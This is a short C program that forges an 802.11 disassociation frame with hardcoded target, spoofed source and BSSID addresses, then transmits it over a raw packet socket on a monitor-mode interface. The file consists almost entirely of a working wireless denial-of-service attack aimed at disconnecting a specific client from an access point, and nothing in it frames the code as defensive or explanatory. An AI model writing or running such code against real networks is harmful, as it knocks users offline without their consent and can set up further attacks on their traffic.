#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <asm/types.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// 28 bytes disassociation packet.

char d[] = { 0xa0, 0x00,    // 0xa0 pacote Disassociate  0xa000 FC 
Normal
            0x00, 0x00, // Duration ID
            0x00, 0x12, 0xf0, 0x29, 0x77, 0x00, // DST addr
            0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, // SRC addr
            0x00, 0x0f, 0x66, 0x11, 0x7b, 0xd0, // BSS id
            0x00, 0x00, // Frag. Number
            0x01, 0x00, 0x00, 0x00 }; // 2 bytes - Reason code

int main() {
       struct sockaddr_ll link;
       struct ifreq iface;
       int s;
       char packet[sizeof(d)];
       int len = 0;

       if((s=socket(PF_INET, SOCK_DGRAM, 0))<0)
               return 0;

       bzero(&iface,sizeof(iface));
       bzero(&link,sizeof(link));
       bzero(packet,sizeof(d));

       strcpy(iface.ifr_name,"ath0raw");

       if(ioctl(s,SIOCGIFHWADDR, &iface)) {
               return 0;
       }

       if(ioctl(s,SIOCGIFINDEX, &iface)) {
               return -1;
       }

       if((s=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0) {
               return -1;
    }

       link.sll_family = AF_PACKET;
       link.sll_ifindex = iface.ifr_ifindex;

 if(bind(s,(struct sockaddr *) &link, sizeof(link))<0) {
               return -1;
       }

       memcpy(packet,d,sizeof(d));
       len = sendto(s,packet,sizeof(d), 0, NULL, 0);
       usleep(5000);
       printf("%d bytes enviados\n",len);

       close(s);

       return 0;
}

